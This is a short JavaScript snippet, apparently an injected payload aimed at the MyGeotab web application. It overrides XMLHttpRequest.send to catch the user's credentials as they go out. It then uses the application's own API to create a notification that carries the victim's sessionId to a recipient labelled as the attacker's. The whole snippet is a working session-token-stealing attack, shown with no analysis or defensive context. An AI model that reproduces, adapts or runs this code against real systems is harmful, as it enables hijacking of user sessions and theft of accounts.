const ATTACKER_RECIP = 'b35';
const _send = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
  try {
    const c = JSON.parse(body).params.credentials;      
    if (c && c.sessionId) {
      XMLHttpRequest.prototype.send = _send;            
      fetch(location.origin + '/apiv1', { method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Application-Name': 'MyGeotab' },
        body: JSON.stringify({ method: 'Add', params: { typeName: 'Notification', entity: {
          recipient: { id: ATTACKER_RECIP },
          dateTime: new Date().toISOString(),
          dateTimeEnd: '2099-12-31T23:59:59.999Z',
          notificationApplicationExceptionData: { source: 'token', description: 'token',
            info: c.sessionId, machineName: 'token' } },
          credentials: c } }) });                        
    }
  } catch (e) { console.log('zz', e); }
  return _send.apply(this, arguments);
};
